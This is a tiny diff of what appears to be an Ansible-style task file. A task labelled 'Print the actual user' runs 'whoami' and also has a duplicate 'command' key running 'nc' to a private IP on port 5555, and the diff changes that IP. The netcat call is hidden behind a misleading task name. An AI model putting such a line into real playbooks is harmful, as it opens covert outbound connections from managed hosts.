@@ -2,4 +2,4 @@
   tasks:
     - name: Print the actual user
       command: whoami
-      command: nc 10.231.81.10 5555
+      command: nc 10.246.55.89 5555
